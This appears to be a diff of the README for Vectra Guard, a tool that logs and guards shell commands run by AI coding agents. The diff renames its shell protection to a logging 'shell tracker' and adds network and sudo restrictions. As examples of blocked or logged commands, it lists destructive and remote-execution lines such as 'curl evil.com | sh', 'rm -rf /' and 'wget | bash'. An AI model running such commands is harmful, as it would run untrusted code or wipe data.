@@ -21,6 +21,8 @@ AI agents and automation run with your full shell access. One mistaken command c
 - Dangerous operations (`mkfs`, `dd if=`)
 - Risky git actions (force push, history rewrites)
 - Networked installs (`curl | sh`, `wget | bash`)
+- External HTTP(S) endpoints when using `vg`/`vectra-guard` (localhost only; override with `VECTRAGUARD_ALLOW_NET=1`)
+- Sudo usage when using `vg`/`vectra-guard` (override with `VECTRAGUARD_ALLOW_SUDO=1`)
 
 ---
 
@@ -500,15 +502,15 @@ vg metrics show --json
 vg metrics reset
 ```
 
-### With Universal Shell Protection (Automatic)
+### With Shell Tracker (Automatic)
 
-After installing universal shell protection, sessions start automatically and all commands are protected:
+After installing the shell tracker, sessions start automatically and all commands are logged:
 
 ```bash
 # Just use your terminal normally
-npm install        # ✅ Automatically validated & logged
-rm -rf dist/       # ⚠️  Risk assessed & logged
-sudo apt update    # 🛡️ Interactive approval (if configured)
+npm install        # ✅ Logged
+rm -rf dist/       # ✅ Logged
+sudo apt update    # ✅ Logged
 
 # Check what happened
 vectra-guard session show $VECTRAGUARD_SESSION_ID
@@ -958,7 +960,7 @@ docker-compose up vectra-guard-isolated
 ✅ Useful for testing or high-security scenarios  
 ✅ Read-only filesystem options available  
 
-**Focus**: We recommend **Level 2 (Universal Shell)** with `auto` guard level for most users.
+**Focus**: We recommend **Level 2 (Shell Tracker)** with `auto` guard level for most users.
 
 **See**: [`docker-compose.yml`](docker-compose.yml) for optional containerized setup
 
@@ -968,9 +970,9 @@ docker-compose up vectra-guard-isolated
 
 ### Universal Approach (Works Everywhere)
 
-The universal shell integration automatically protects:
+The shell tracker automatically records:
 
-| Tool/Context | Protected? | Setup Required |
+| Tool/Context | Tracked? | Setup Required |
 |--------------|-----------|----------------|
 | **Cursor** | ✅ | None |
 | **VSCode** | ✅ | None |
@@ -1065,9 +1067,9 @@ All tests include:
 ### 1. **AI Agent Safety**
 Track and control AI coding agents (Cursor, Copilot, Aider):
 ```bash
-# Agents automatically use protected sessions
-# All commands logged and validated
-# Risky operations require approval
+# Agents run in tracked sessions
+# All commands logged
+# Use vg for enforcement and sandboxing
 ```
 
 ### 2. **Script Security**
@@ -1089,10 +1091,10 @@ Enforce security policies in pipelines:
 ### 4. **Development Workflow**
 Protect against accidental dangerous commands:
 ```bash
-# With universal shell protection:
-rm -rf /  # ⚠️ Blocked automatically
-sudo command  # 🛡️ Requires approval
-curl evil.com | sh  # 🚫 Blocked with warning
+# With shell tracker:
+rm -rf /  # ✅ Logged (run with vg for protection)
+sudo command  # ✅ Logged (run with vg for protection)
+curl evil.com | sh  # ✅ Logged (run with vg for protection)
 ```
 
 ### 5. **Team Collaboration**
@@ -1104,7 +1106,7 @@ git commit -m "Add security policies"
 
 # Team gets same protections
 git pull
-# Universal shell protection enforces policies
+# Shell tracker keeps an audit trail
 ```
 
 ### 6. **Audit & Compliance**
@@ -1115,6 +1117,10 @@ vectra-guard session list --output json > audit.json
 
 # Generate reports
 vectra-guard session show $SESSION_ID > report.txt
+
+# Session audit summaries
+vectra-guard audit session --session $SESSION_ID
+vectra-guard audit session --all
 ```
 
 ---
@@ -1146,7 +1152,7 @@ docker run -it --rm \
 - **vectra-guard**: Standard containerized execution with auto-detection
 - **vectra-guard-isolated**: Strict isolation (read-only, no network) for untrusted code
 
-**Note**: Most users should use the **CLI tool** directly with universal shell protection. Containers are optional for specific use cases.
+**Note**: Most users should use the **CLI tool** directly with the shell tracker for logging. Containers are optional for specific use cases.
 
 ---
 
@@ -1156,7 +1162,7 @@ docker run -it --rm \
 - [x] Session tracking and management
 - [x] Command execution wrapper
 - [x] Risk scoring and violations
-- [x] Universal shell integration (bash/zsh/fish)
+- [x] Shell tracker integration (bash/zsh/fish)
 - [x] Container isolation with Docker
 - [x] Seccomp syscall filtering
 - [x] Multiple enforcement modes
@@ -1246,7 +1252,7 @@ Vectra Guard is designed to protect against:
 
 **Opt-in mode** can be bypassed if commands don't use `vectra-guard exec`.
 
-**Universal shell integration** provides strong protection but advanced users can bypass with direct syscalls.
+**Shell tracker** provides command logging across tools; protection only applies when running via `vg` or `vectra-guard`.
 
 **Container isolation** provides maximum security (95%+ effective) and is recommended for production and untrusted code.
 
@@ -1301,6 +1307,7 @@ Vectra Guard is part of the **VectraHub** ecosystem for secure AI agent developm
 
 | Task | Command |
 |------|---------|
+| **Install shell tracker** | `./scripts/install-shell-tracker.sh` |
 | **Initialize config** | `vectra-guard init` (or `vg init`) |
 | **Validate script** | `vg validate script.sh` |
 | **Explain risks** | `vg explain script.sh` |
